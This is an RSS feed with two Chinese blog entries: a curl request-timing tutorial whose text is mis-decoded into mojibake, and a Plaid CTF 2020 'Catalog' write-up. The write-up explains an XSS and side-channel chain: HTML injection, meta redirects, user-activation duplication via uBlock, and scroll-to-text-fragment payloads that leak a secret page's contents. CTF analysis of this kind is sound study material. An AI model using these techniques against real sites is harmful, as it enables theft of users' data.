<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <generator>NUAA</generator>
    <id>https://blogroll.a2os.club</id>
    <title>NUAARSS</title>
    <updated>2020-05-15T06:05:31+08:00</updated>
    <link href="https://blogroll.a2os.club"/>
    <author>
        <name>NUAARSS</name>
    </author>
    
    
    <entry>
        <id>https://blog.triplez.cn/using-curl-analyzing-time-cost-at-request-diff-phases/</id>
        <title><![CDATA[‰ΩøÁî® curl Êù•ÂàÜÊûêËØ∑Ê±ÇÂêÑ‰∏™Èò∂ÊÆµÁöÑËÄóÊó∂]]></title>
        <updated>2020-05-11T15:35:41+08:00</updated>
        <link href="https://blog.triplez.cn/using-curl-analyzing-time-cost-at-request-diff-phases/"/>
        <content type="text/html" src="https://blog.triplez.cn/using-curl-analyzing-time-cost-at-request-diff-phases/"><![CDATA[<h2>How</h2>
<p>Ëøô‰∏™ÂäüËÉΩÁî®Âà∞ÁöÑÊòØ <code>curl</code> ÁöÑ <code>-w</code> ÈÄâÈ°πÔºåËÆ©Êàë‰ª¨Êù•ÂÖàÁúãÁúã <code>curl</code> ÁöÑ man pageÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">-w, --write-out &lt;format&gt;
       Make curl display information on stdout after a completed transfer. The format is  a  string  that  may  contain lain  text  mixed  with  any number of variables. The format can be specified as a literal "string", or you can have curl read the format from a file with "@filename" and to tell curl to read the format from stdin you  write "@-".

       The variables present in the output format will be substituted by the value or text that curl thinks fit, as de‚Äê scribed below. All variables are specified as %{variable_name} and to output a normal % you just write  them  as %%. You can output a newline by using \n, a carriage return with \r and a tab space with \t.

       The output will be written to standard output, but this can be switched to standard error by using %{stderr}.‰ΩøÁî® curl ÂëΩ‰ª§ÂàÜÊûêËØ∑Ê±ÇÁöÑËÄóÊó∂ÊÉÖÂÜµ
</code></pre>
<p>‰∏ãÈù¢ÁöÑÂÜÖÂÆπÂ∞±ÊòØÂêÑÁßçÂÜÖÁΩÆÂèòÈáè‰∫ÜÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáËøô‰∫õÂèòÈáèÁöÑÂÄºÊù•‰∏ÄÁ™•ËØ∑Ê±ÇÁöÑÁúüÂÆû‰ø°ÊÅØ„ÄÇ</p>
<p>‰ª•‰∏ãÊúâ‰∏Ä‰∏™‚ÄúÂπø‰∏∫ÊµÅ‰º†‚ÄùÁöÑÊ†ºÂºèÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">    time_namelookup:  %{time_namelookup}\n
       time_connect:  %{time_connect}\n
    time_appconnect:  %{time_appconnect}\n
      time_redirect:  %{time_redirect}\n
   time_pretransfer:  %{time_pretransfer}\n
 time_starttransfer:  %{time_starttransfer}\n
                    ----------\n
         time_total:  %{time_total}\n
</code></pre>
<p>Â∞ÜÂ¶Ç‰∏äÂÜÖÂÆπÂÜôËá≥ <code>curl-format</code> Êñá‰ª∂‰∏≠ÔºåÁÑ∂ÂêéÂú®ÂΩìÂâçÁõÆÂΩïËøêË°åÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ curl -w @curl-format -o /dev/null -s -L http://triplez.cn
</code></pre>
<blockquote>
<ul>
<li><code>-w @curl-format</code> Ôºö‰ΩøÁî® <code>curl-format</code> Êñá‰ª∂Ê®°ÊùøËøõË°åËæìÂá∫„ÄÇ</p>
</li>
<li>
<p><code>-o /dev/null</code> ÔºöÂøΩÁï•ËæìÂá∫ÂÜÖÂÆπ„ÄÇ</p>
</li>
<li>
<p><code>-s</code> Ôºö‰∏çËæìÂá∫Â§ö‰Ωô‰ø°ÊÅØ„ÄÇ</p>
</li>
<li><code>-L</code> ÔºöÊîØÊåÅË∑≥ËΩ¨ÔºàÂ¶Ç HTTP Ë∑≥ËΩ¨Ëá≥ HTTPSÔºâ„ÄÇ</li>
</ul>
</blockquote>
<p>Â∞±‰ºöÁúãÂà∞ÂÉèËøôÊ†∑ÁöÑËæìÂá∫Ôºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-null">    time_namelookup:  0.001931
       time_connect:  0.032337
    time_appconnect:  0.120072
      time_redirect:  0.000000
   time_pretransfer:  0.120124
 time_starttransfer:  0.151386
                    ----------
         time_total:  0.152068
</code></pre>
<p>Ëøô‰∫õÂèòÈáèÁöÑÊÑè‰πâÊòØÔºö</p>
<ul>
<li><code>time_namelookup</code>ÔºöDNS ÂüüÂêçËß£ÊûêÁöÑËÄóÊó∂„ÄÇ</li>
<li><code>time_connect</code>ÔºöTCP ËøûÊé•Âª∫Á´ãËÄóÊó∂„ÄÇ</li>
<li><code>time_appconnect</code>ÔºöSSL/SSH Á≠â‰∏äÂ±ÇÂçèËÆÆÂª∫Á´ãËøûÊé•ÁöÑËÄóÊó∂ÔºåÊØîÂ¶Ç connect/handshake ËÄóÊó∂Ôºà‰ªéÊ≠§Â§Ñ‰πüÂèØÁúãÂá∫ÔºåÊúÄÂêéËøòÊòØËØ∑Ê±Ç‰∫Ü <code>https://triplez.cn</code> ÔºåÂê¶Âàô HTTP ‰∏ç‰ºö‰∫ßÁîü <code>time_appconnect</code> ÁöÑËÄóÊó∂„ÄÇ</li>
<li><code>time_redirect</code>Ôºö‰ªéÂºÄÂßãÂà∞ÊúÄÂêé‰∏Ä‰∏™ËØ∑Ê±Ç‰∫ãÂä°ÁöÑËÄóÊó∂„ÄÇ</li>
<li><code>time_pretransfer</code>Ôºö‰ªéËØ∑Ê±ÇÂºÄÂßãÂà∞ÂìçÂ∫îÂºÄÂßã‰º†ËæìÁöÑËÄóÊó∂„ÄÇ</li>
<li><code>time_starttransfer</code>Ôºö‰ªéËØ∑Ê±ÇÂºÄÂßãÂà∞Á¨¨‰∏Ä‰∏™Â≠óËäÇÂ∞ÜË¶Å‰º†ËæìÁöÑËÄóÊó∂„ÄÇ</li>
<li><code>time_total</code>ÔºöËøôÊ¨°ËØ∑Ê±ÇÁöÑÊÄªËÄóÊó∂„ÄÇ</li>
</ul>
<h2>One more thing...</h2>
<p><a href="https://github.com/reorx">reorx</a> ÂÜô‰∫Ü‰∏™ Python ÁöÑÂ∞èÂ∑•ÂÖ∑ <a href="https://github.com/reorx/httpstat">httpstat</a>ÔºåËÆ©ÂëΩ‰ª§Ë°åÂàÜÊûêËØ∑Ê±ÇËÄóÊó∂Êõ¥Âä†Áõ¥ËßÇ„ÄÇÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Âç≥ÂèØÂÆâË£ÖÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ pip install httpstat
</code></pre>
<p>ËÆ©Êàë‰ª¨Êù•ËØï‰∏Ä‰∏ãÔºö</p>
<pre class="line-numbers prism-highlight" data-start="1"><code class="language-bash">$ httpstat -L http://triplez.cn
Connected to 123.206.208.167:443 from 192.168.0.10:34372

HTTP/1.1 302 Found
Date: Mon, 11 May 2020 15:24:00 GMT
Server: Apache
Location: https://triplez.cn/
Content-Length: 203
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Mon, 11 May 2020 15:24:00 GMT
Server: Apache
Last-Modified: Sun, 08 Mar 2020 07:48:35 GMT
ETag: "7258f-f13-5a0531d213ac0"
Accept-Ranges: bytes
Content-Length: 3859
Content-Type: text/html; charset=UTF-8

Body stored in: /tmp/tmpkeq3ospo

  DNS Lookup   TCP Connection   Server Processing   Content Transfer
[    32ms    |      66ms      |       73ms        |        1ms       ]
             |                |                   |                  |
    namelookup:32ms           |                   |                  |
                        connect:98ms              |                  |
                                      starttransfer:266ms            |
                                                                 total:267ms  
</code></pre>
<p>‰ªéËæìÂá∫‰∏äÊàë‰ª¨Â∞±ÂèØ‰ª•ÂæàÁõ¥ËßÇÂú∞ÁúãÂá∫Êù•Ôºå‰ªé <code>http://triplez.cn</code> Âà∞ <code>https://triplez.cn</code> ‰∏≠ÂÆåÊàê‰∫Ü‰∏ÄÊ¨° 302 Ë∑≥ËΩ¨ÔºåÂú®ËæìÂá∫Êú´Â∞æÁöÑÁ§∫ÊÑèÂõæ‰∏äÊàë‰ª¨‰πüÂèØ‰ª•Ê∏ÖÊ•öÂú∞ÁúãÂà∞ÂêÑÈò∂ÊÆµÁöÑËÄóÊó∂„ÄÇ</p>
<p>Happy hacking üòõ</p>
<h2>References</h2>
<ul>
<li><a href="https://cizixs.com/2017/04/11/use-curl-to-analyze-request/">‰ΩøÁî® curl ÂëΩ‰ª§ÂàÜÊûêËØ∑Ê±ÇÁöÑËÄóÊó∂ÊÉÖÂÜµ</a></li>
</ul>
<p>The post <a rel="nofollow" href="https://blog.triplez.cn/using-curl-analyzing-time-cost-at-request-diff-phases/">‰ΩøÁî® curl Êù•ÂàÜÊûêËØ∑Ê±ÇÂêÑ‰∏™Èò∂ÊÆµÁöÑËÄóÊó∂</a> appeared first on <a rel="nofollow" href="https://blog.triplez.cn">Blog</a>.</p>]]></content>
        <author>
            <name><![CDATA[TripleZ‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/</id>
        <title><![CDATA[Plaid CTF 2020 Catalog]]></title>
        <updated>2020-05-05T17:31:59+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/"><![CDATA[<html><head></head><body><p>&#x672C;&#x6587;&#x662F;&#x5173;&#x4E8E; Plaid CTF 2020 Catalog &#x9898;&#x76EE;&#x7684;&#x4E00;&#x4E9B;&#x590D;&#x76D8;&#x4E0E;&#x63A2;&#x7A76;&#x3002;</p><a id="more"></a><p>&#x8FD9;&#x9053;&#x9898;&#x662F;&#x672C;&#x6B21; PlaidCTF &#x5168;&#x573A;&#x552F;&#x4E00;&#x4E00;&#x9053;0&#x89E3;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;&#x662F;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x96BE;&#x5EA6;&#x7684;&#xFF0C;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x3002;&#x8FD9;&#x91CC;&#x975E;&#x5E38;&#x611F;&#x8C22; @wupco @rebirthwyw @bks25wzsx&#xFF08;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;@zsx &#x53C8;&#x540D; @bks25wzsx&#xFF09;&#x5E08;&#x5085;&#x4EEC;&#x7684;&#x6307;&#x70B9;&#xFF0C;&#x590D;&#x76D8;&#x7684;&#x65F6;&#x5019;&#x6BD4;&#x8F83;&#x8270;&#x96BE;&#xFF0C;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x6211;&#x4F1A;&#x5C3D;&#x91CF;&#x7528;&#x81EA;&#x5DF1;&#x8FD8;&#x7B97;&#x6BD4;&#x8F83;&#x6E05;&#x6670;&#x7684;&#x903B;&#x8F91;&#x8BB2;&#x4E00;&#x4E0B;&#x672C;&#x9053;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x54EA;&#x91CC;&#x6709;&#x51FA;&#x9519;&#x7684;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x591A;&#x591A;&#x5305;&#x6DB5;&#x3002;</p><p>&#x7531;&#x4E8E;&#x8FD9;&#x4E2A;&#x9898;&#x662F;&#x590D;&#x76D8;&#x9898;&#xFF0C;&#x6240;&#x4EE5;&#x505A;&#x9898;&#x601D;&#x8DEF;&#x53EF;&#x80FD;&#x4F1A;&#x5C11;&#x4E00;&#x4E9B;&#xFF0C;&#x66F4;&#x591A;&#x7684;&#x662F;&#x5BF9;&#x4E8E;&#x51FA;&#x9898;&#x70B9;&#x4EE5;&#x53CA;exp&#x4E00;&#x4E9B;&#x5206;&#x6790;&#x4EC0;&#x4E48;&#x7684;&#x3002;</p><blockquote class="colorquote danger"><p>5&#x6708;6&#x65E5;&#x66F4;&#x65B0;&#xFF1A;&#x4F5C;&#x8005;&#x5DF2;&#x7ECF;&#x653E;&#x51FA;&#x4E86;&#x4ED6;&#x7684; Write Up&#x2014;&#x2014;<a href="https://dttw.tech/posts/B19RXWzYL" target="_blank" rel="noopener">PlaidCTF 2020: Catalog Writeup</a> &#xFF0C;&#x9898;&#x76EE;&#x4ED3;&#x5E93;&#x2014;&#x2014; <a href="https://github.com/bluepichu/ctf-challenges/tree/master/plaidctf-2020/catalog" target="_blank" rel="noopener">catalog</a> &#xFF0C;&#x6587;&#x4E2D;&#x5185;&#x5BB9;&#x53EF;&#x80FD;&#x4E0E;&#x4F5C;&#x8005; Write Up &#x6709;&#x4E9B;&#x8BB8;&#x51FA;&#x5165;&#xFF0C;&#x8BF7;&#x4EE5;&#x4F5C;&#x8005;&#x7684; Write Up &#x4E3A;&#x51C6;&#xFF01;&#x672C;&#x6587;&#x6682;&#x672A;&#x66F4;&#x65B0;&#xFF01;</p></blockquote><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><blockquote><p><a href="http://catalog.pwni.ng/" target="_blank" rel="noopener">Here&#x2019;s the site</a>. The flag is on <a href="http://catalog.pwni.ng/issue.php?id=3" target="_blank" rel="noopener">this page</a>.</p><p>Browser: Chromium <strong>with uBlock Origin 1.26.0 installed and in its default configuration</strong></p><p>Flag format: <code>/^PCTF\{[A-Z0-9_]+\}$/</code></p><p><strong>Hints</strong>:</p><ul><li>To view your post, the admin will click on a link on the admin page.</li><li>You might want to read up on User Activation.</li><li>The intended solution does not require you to submit hundreds of captchas.</li></ul><p>Hint: Admin Bot Timeout</p><p>The admin bot will always disconnect after about 30 seconds.    </p></blockquote><p>&#x7ED9;&#x6CA1;&#x6709;&#x770B;&#x9898;&#x7684;&#x5C0F;&#x4F19;&#x4F34;&#x7B80;&#x7565;&#x5730;&#x6982;&#x62EC;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#xFF0C;&#x9898;&#x76EE;&#x662F;&#x4E2A;&#x9ED1;&#x76D2;&#xFF0C;&#x6709;&#x767B;&#x5F55;&#x6CE8;&#x518C;&#x3001;&#x53D1;&#x8868; issue &#x3001;&#x63D0;&#x4EA4; issue &#x7ED9; admin &#x770B;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x8FD9;&#x4E9B;&#x529F;&#x80FD;&#xFF0C;&#x5F88;&#x660E;&#x663E;&#x9898;&#x76EE;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x8FDB;&#x884C; XSS</p><p>&#x5176;&#x4E2D;&#x6709;&#x51E0;&#x4E2A;&#x7EC6;&#x8282;&#x6F0F;&#x6D1E;&#xFF1A;</p><ol><li><p>&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x76F4;&#x63A5;&#x65E0;&#x8FC7;&#x6EE4;&#x5730;&#x56DE;&#x663E;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x5904; HTML &#x6CE8;&#x5165;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423014836.png" alt></p></li><li><p>&#x5728;&#x63D0;&#x4EA4; issue &#x5904;&#xFF0C;&#x6709;&#x4E00;&#x9879;&#x9700;&#x8981;&#x63D0;&#x4EA4; image URL &#x7684;&#x5730;&#x65B9;&#x4E5F;&#x5B58;&#x5728;&#x7740; HTML &#x6CE8;&#x5165;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423021048.png" alt></p></li><li><p>&#x9898;&#x76EE;&#x8BBE;&#x7F6E;&#x8FD8;&#x4F1A;&#x5229;&#x7528; session &#x6765;&#x5B58;&#x50A8;&#x4E00;&#x4E9B; HTML &#x5143;&#x7D20;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x5728;&#x540C;&#x4E00;&#x4E2A; session &#x5148;&#x767B;&#x5F55;&#xFF0C;&#x518D;&#x7528;&#x8FD9;&#x4E2A; session &#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5237;&#x65B0;&#x6211;&#x4EEC;&#x5DF2;&#x767B;&#x5F55;&#x7684;&#x9875;&#x9762;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF1A;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424222148.png" alt></p></li></ol><h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><p></p><figure class="highlight csp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&apos;nonce-xhncdWd319Yj3acHJbKoEWmK8stBxy88&apos;</span>; <span class="hljs-keyword">img-src</span> *; <span class="hljs-keyword">font-src</span> <span class="hljs-string">&apos;self&apos;</span> fonts.gstatic.com; <span class="hljs-keyword">frame-src</span> https://www.google.com/recaptcha/</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9898;&#x76EE;&#x7ED9;&#x7684; CSP &#x662F;&#x8FD9;&#x4E9B;&#xFF0C;&#x8FD9;&#x4E9B; CSP &#x9650;&#x5236;&#x4E86;&#x6211;&#x4EEC;&#x63D2;&#x5165;&#x7684;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x91CC;&#x5E76;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E; base-uri &#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BD5;&#x56FE;&#x5229;&#x7528; HTML &#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x5229;&#x7528;<code>&lt;base&gt;</code>&#x6765;&#x8FDB;&#x884C; XSS &#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x50CF; RCTF 2018 rblog &#x90A3;&#x9053;&#x9898;&#xFF0C;&#x8FD9;&#x9053;&#x9898;&#x7684;&#x63D2;&#x5165;&#x70B9;&#x5728;&#x6BD4;&#x8F83;&#x9760;&#x540E;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x63A7;&#x5236;&#x4E4B;&#x524D;&#x5F15;&#x5165;&#x6587;&#x4EF6;&#x7684; url &#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x5229;&#x7528; base uri &#x7684;&#x601D;&#x8DEF;&#x6765;&#x8FDB;&#x884C; XSS </p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><blockquote><p>Catalog has two injections: the image tag on the issue page and the username when you fail to login.  Use the image tag one with a meta redirect to get offsite.  Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.  Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.  Now make a no-cors POST to use the failed login injection, then send them to issue.php?id=3.  So now we have arbitrary content with a user activation on the correct page, but still no code exec.  (&#x2026;the rest of the exploit to come in a moment&#x2026;)</p><p>(&#x2026;continuation of previous post&#x2026;) Ok, but what can we do?  A recent addition to Chromium was scroll-to-text-fragment, which lets you search the page for text (in entire words only) and scroll to it, <em>though this consumes the user activation</em>.  If you could search for a letter at a time, then you could use your injection to add a bunch of whitespace and a lazy-loading image to detect the scroll.It turns out you can: the whole-word match counts tag boundaries as word boundaries, and the <code>&lt;em&gt;</code> tag gets split into a <code>&lt;span&gt;</code> for each individual letter on load!  So you can do text searches of the form <code>#:~:text=F-,{,-X</code> for example to search for an X at the beginning of the flag.  You can specify multiple text searches to do a binary search across the whole alphabet.  Also include a meta refresh to send back offsite again after a short delay and you can leak ~5 characters per captcha.  Repeat 5 or 6 times to get the whole flag.</p></blockquote><p>&#x8FD9;&#x4E00;&#x6BB5;&#x662F;&#x8D5B;&#x540E; @bluepichu &#x5728; irc &#x4E0A;&#x8BF4;&#x7684;&#x4E00;&#x6BB5;&#x8BDD;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x5BF9; catalog &#x8FD9;&#x9053;&#x9898;&#x76EE;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x7B80;&#x77ED;&#x7684; wp &#x3002;</p><p>&#x540C;&#x65F6;&#xFF0C;@lbherrera_ &#x5728;&#x8D5B;&#x540E;&#x53D1;&#x4E86;&#x4E00;&#x4E2A;&#x63A8;&#x7279;&#x516C;&#x5F00;&#x4E86;&#x4ED6;&#x4E00;&#x90E8;&#x5206;&#x672C;&#x9898;&#x7684; exp :</p><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/lbherrera_/status/1251994130298875904" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="//platform.twitter.com/widgets.js" charset="utf-8"></script><p>Exp &#x5730;&#x5740;&#x5728;: <a href="https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b" target="_blank" rel="noopener">https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b</a></p><p>&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x9057;&#x61BE;&#x7684;&#x662F;&#xFF0C;&#x8BE5;&#x4F5C;&#x8005;&#x5230;&#x76EE;&#x524D;&#x4E3A;&#x6B62;&#x8FD8;&#x5E76;&#x672A;&#x53D1;&#x5E03;&#x4ED6;&#x81EA;&#x5DF1;&#x7684; write up &#xFF0C;&#x5982;&#x679C;&#x5927;&#x5BB6;&#x80FD;&#x770B;&#x61C2;&#x8FD9;&#x4E9B;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x9898;&#x540E;&#x9762;&#x7684;&#x90E8;&#x5206;&#x5927;&#x5BB6;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x4E86;&#xFF0C;&#x540E;&#x6587;&#x4E5F;&#x5C31;&#x662F;&#x57FA;&#x672C;&#x6309;&#x7167;&#x8FD9;&#x4E2A;&#x5927;&#x81F4;&#x7684;&#x601D;&#x8DEF;&#x6765;&#x5206;&#x6790;&#x8FD9;&#x4E2A;&#x9898;&#x7684;&#x3002;    </p><h3 id="User-Activation"><a href="#User-Activation" class="headerlink" title="User Activation"></a>User Activation</h3><p><strong>&#x8FD9;&#x90E8;&#x5206;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x7684;&#x7406;&#x89E3;&#x4E5F;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x6DF1;&#x523B;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x662F;&#x6BD4;&#x8F83;&#x7C97;&#x6D45;&#x7684;&#x4E2A;&#x4EBA;&#x7406;&#x89E3;&#xFF0C;&#x5982;&#x6709;&#x9519;&#x8BEF;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x76F4;&#x63A5;&#x6307;&#x51FA;&#x3002;</strong></p><p><strong>&#x672C;&#x90E8;&#x5206;&#x53C2;&#x8003;&#x4E3B;&#x8981;&#x662F;&#x4E24;&#x4E2A;&#x6587;&#x6863;&#xFF1A;<a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank" rel="noopener">User Activation v2</a>&#x3001;<a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank" rel="noopener">User Activation v2 (UAv2)</a>&#xFF0C;&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x5BF9;&#x82F1;&#x6587;&#x9605;&#x8BFB;&#x7406;&#x89E3;&#x6BD4;&#x8F83;&#x597D;&#xFF0C;&#x66F4;&#x5EFA;&#x8BAE;&#x770B;&#x539F;&#x6587;</strong></p><p>&#x2018;User Activation&#x2019; &#x8FD9;&#x4E2A;&#x8BCD;&#x770B;&#x8D77;&#x6765;&#x6BD4;&#x8F83;&#x7684;&#x5173;&#x952E;&#xFF0C;&#x51FA;&#x73B0;&#x5728;&#x4E86;&#x4F5C;&#x8005;&#x7684;&#x89E3;&#x91CA;&#x4EE5;&#x53CA; hint &#x5F53;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x4F5C;&#x8005;&#x653E; hint &#x8981;&#x7279;&#x610F;&#x7ED9; &#x2018;User Activation&#x2019; &#x8FD9;&#x4E2A;&#x8BCD;&#x800C;&#x4E0D;&#x662F;&#x76F8;&#x5BF9;&#x4E8E;&#x66F4;&#x50CF;&#x901A;&#x4FD7;&#x7684; &#x2018;User Interaction&#x2019; &#x5462;&#xFF1F;</p><p>&#x968F;&#x4FBF;&#x641C;&#x4E00;&#x4E0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053; &#x2018;User Activation&#x2019; &#x5176;&#x5B9E;&#x7B97;&#x662F;&#x4E00;&#x4E2A;&#x672F;&#x8BED;&#xFF1A;</p><blockquote><p>&#x200B;    User activation is the mechanism to maintain active-user-interaction state that limits use of &#x201C;abusable&#x201D; APIs (e.g. opening popups or vibrating).</p></blockquote><p>&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;User Activation(&#x6211;&#x4EEC;&#x6682;&#x4E14;&#x79F0;&#x4E3A;&#x201C;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x72B6;&#x6001;&#x201D;)&#xFF0C;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x7528;&#x6237;&#x4E3B;&#x52A8;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x9650;&#x5236;&#x4E86;&#x4E00;&#x4E9B;&#x88AB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x7684; API &#xFF0C;&#x6BD4;&#x5982;&#x5F39;&#x7A97;&#x6216;&#x8005;&#x9707;&#x52A8;&#x3002;&#x201D;&#x6FC0;&#x6D3B; &#x201C;&#x72B6;&#x6001;&#x901A;&#x5E38;&#x610F;&#x5473;&#x7740;&#x7528;&#x6237;&#x5F53;&#x524D;&#x901A;&#x8FC7;&#x67D0;&#x79CD;&#x8F93;&#x5165;&#x673A;&#x5236;&#xFF08;&#x6253;&#x5B57;&#x3001;&#x70B9;&#x51FB;&#x9F20;&#x6807;&#x7B49;&#xFF09;&#x4E0E;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#xFF0C;&#x6216;&#x8005;&#x7528;&#x6237;&#x5728;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x540E;&#x5B8C;&#x6210;&#x4E86;&#x67D0;&#x79CD;&#x4EA4;&#x4E92;&#x3002;</p><p>&#x6D4F;&#x89C8;&#x5668;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x8FD9;&#x79CD;&#x72B6;&#x6001;&#x6765;&#x63A7;&#x5236;&#x5BF9;&#x88AB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x7684; API &#x8BBF;&#x95EE;&#xFF0C;&#x8FD9;&#x79CD; API &#x6700;&#x660E;&#x663E;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x662F;&#x901A;&#x8FC7;<code>window.open()</code>&#x6253;&#x5F00;&#x5F39;&#x51FA;&#x7A97;&#x53E3;&#x3002;&#x5F53;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x6D41;&#x6C13;&#x5F00;&#x53D1;&#x8005;&#x5F00;&#x59CB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x8BE5; API &#x4EFB;&#x610F;&#x5F39;&#x7A97;&#x540E;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x6D4F;&#x89C8;&#x5668;&#x52A0;&#x5165;&#x4E86;&#x5728;&#x7528;&#x6237;&#x672A;&#x4E3B;&#x52A8;&#x4E0E;&#x9875;&#x9762;&#x4EA4;&#x4E92;&#x65F6;&#x963B;&#x6B62;&#x5F39;&#x7A97;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4ECE;&#x90A3;&#x65F6;&#x8D77;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x9010;&#x6E10;&#x4F7F;&#x8BB8;&#x591A;&#x5176;&#x4ED6; API &#x4F9D;&#x8D56;&#x4E8E;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#xFF08;&#x66F4;&#x51C6;&#x786E;&#x5730;&#x8BF4;&#xFF0C;&#x4F7F;&#x5B83;&#x4EEC;&#x53D7;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x63A7;&#x5236;&#xFF09;&#xFF0C;&#x6BD4;&#x5982;&#x5168;&#x5C4F;&#x3001;&#x9707;&#x52A8;&#xFF0C;&#x81EA;&#x52A8;&#x64AD;&#x653E;&#x5A92;&#x4F53;&#x7B49;&#xFF0C; Chrome &#x4E2D;&#x7EA6;&#x6709;30&#x79CD;&#x4E0D;&#x540C;&#x7684; API &#x7531;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x63A7;&#x5236;&#x3002;</p><h3 id="uBlock"><a href="#uBlock" class="headerlink" title="uBlock"></a>uBlock</h3><blockquote><p>uBlock Origin (or uBlock&#x2080;) is not an <em>ad blocker</em>; it&#x2019;s a general-purpose blocker. uBlock Origin blocks ads through its support of the <a href="https://adblockplus.org/en/filters" target="_blank" rel="noopener">Adblock Plus filter syntax</a>. uBlock Origin <a 